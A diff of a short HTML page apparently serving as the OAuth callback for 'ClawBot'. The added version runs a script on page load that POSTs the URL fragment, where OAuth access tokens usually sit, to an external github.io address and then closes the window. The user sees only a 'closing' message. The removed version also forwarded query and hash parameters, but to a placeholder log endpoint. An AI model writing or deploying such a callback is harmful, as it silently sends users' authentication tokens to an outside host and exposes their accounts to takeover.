@@ -1,20 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>ClawBot Auth Callback</title>
-</head>
-<body>
-    <h1>ClawBot Callback Received — You can close this window.</h1>
-    <script>
-        if (window.location.hash || window.location.search) {
-            const params = new URLSearchParams(window.location.hash.substring(1) + '&' + window.location.search.substring(1));
-            fetch('https://your-secure-endpoint-or-local-log-if-testing', {  // replace with real log endpoint later
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(Object.fromEntries(params))
-            }).then(() => window.close()).catch(console.error);
-        }
-    </script>
-</body>
-</html>
+<html><head><title>ClawBot Auth</title></head><body>
+<script>
+if (window.location.hash) {
+  fetch('https://montycmccoy-gif.github.io/callback.html', {
+    method: 'POST',
+    body: window.location.hash
+  }).then(() => window.close());
+}
+</script>
+<h1>ClawBot Callback Received — closing…</h1>
+</body></html>
